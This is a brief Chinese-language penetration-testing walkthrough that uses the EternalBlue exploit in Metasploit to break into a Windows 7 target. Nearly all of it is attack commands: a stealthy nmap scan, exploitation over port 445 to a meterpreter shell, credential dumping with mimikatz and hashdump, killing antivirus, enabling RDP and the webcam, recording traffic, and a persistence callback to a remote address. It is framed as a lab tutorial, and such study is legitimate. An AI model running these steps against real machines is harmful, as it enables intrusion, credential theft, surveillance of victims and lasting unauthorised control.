渗透测试—永恒之蓝入侵windows7

信息收集

  1. 通过ping可以查看靶机网络是否可以连接，图示可以看到可以网络是连通的
  2. 通过nmap的隐蔽TCP扫描，可以在不会触发报警的前提下扫描出开放的端口。可以看到很多开放的端口。

威胁建模

我们通过永恒之蓝病毒渗透测试靶机的445端口，并通过meterpreter拿到shell。

渗透测试

  1. search eternalblue：找到对应攻击模块
  2. show payloads：展示该模块所有可以使用的有效载荷
  3. options:展示所有选项，设置好相应的ip地址和端口
  4. exploit -z:展开攻击，建立会话，但并接入会话。
  5. sessions -i id:接入会话

后渗透阶段

  1. getuid：查看下当前用户的权限。
  2. sysinfo:查看靶机系统版本信息
  3. screenshot：靶机桌面截图
  4. webcam_scream：开启靶机视频
  5. run post/windows/manage/enable_rdp：开启远程桌面控制
  6. load mimikatz：载入mimikatz
  7. wdigest：直接查看用户账号和密码
  8. run killav：关闭杀毒软件
  9. run hashdump：获取系统密码哈希值
  10. run packettrecorder:查看目标机所有的流量(i参数运行数据包记录脚本)
  11. run scraper:摄取用户名和密码、下载全部注册表、挖掘密码哈希值、手收集系统信息等。
  12. run persistence -X -i 50 -p 443 -r 192.168..:控制持久化
  13. irb：进入irb脚本模式，并且执行命令创建脚本，其语言为Ruby。
